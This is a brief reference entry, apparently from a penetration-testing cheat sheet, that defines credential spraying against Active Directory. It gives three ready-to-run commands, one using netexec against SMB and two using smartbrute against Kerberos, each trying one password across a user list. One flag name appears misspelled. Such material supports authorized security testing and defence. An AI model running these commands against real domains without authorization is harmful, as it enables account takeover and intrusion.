Credential spraying is a technique that attackers use to try a few passwords (or keys) against a set of usernames instead of a single one. 
```bash
# netexec example
nxc smb target_ip -d domain.local -u users.txt -p "password" --no-bruteforce --continue-on-succes

# smartbrute example (dynamic user list)
smartbrute smart -bp "password" kerberos -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kdc-ip "$KDC" kerberos

# smartbrute example (static users list)
smartbrute brute -bU users.txt -bp "password" kerberos --kdc-ip "$KDC"
```